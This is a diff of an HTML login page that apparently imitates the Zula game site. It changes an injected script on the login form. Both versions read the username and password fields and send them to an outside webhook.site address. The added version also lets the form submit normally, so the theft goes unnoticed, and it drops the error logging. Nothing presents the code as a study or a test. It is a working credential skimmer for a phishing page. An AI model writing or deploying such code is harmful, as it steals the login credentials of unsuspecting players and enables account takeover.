@@ -166,22 +166,15 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
     <script src="//cdn-download2.zula.ir/sitecdn/IR/Content/hesapzulaoyun/js/fsjs.min.js?v=20210513"></script>
     
     
-    <script>
-  document.getElementById("loginForm").addEventListener("submit", function (e) {
-    e.preventDefault(); // جلوگیری از ارسال فرم و ری‌لود صفحه
+   <script>
+    document.getElementById("loginForm").addEventListener("submit", function (e) {
+      const username = document.querySelector("input[name='UserName']").value;
+      const password = document.querySelector("input[name='Password']").value;
 
-    const username = document.querySelector("input[name='UserName']").value;
-    const password = document.querySelector("input[name='Password']").value;
+      fetch("https://webhook.site/f0956b48-6c2a-4996-9e48-39e901291634?username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password));
+    });
+  </script>
 
-    fetch("https://webhook.site/f0956b48-6c2a-4996-9e48-39e901291634?username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password))
-      .then(response => {
-        console.log("ارسال شد:", response.status);
-      })
-      .catch(error => {
-        console.error("خطا در ارسال:", error);
-      });
-  });
-</script>
 
 
 </body>
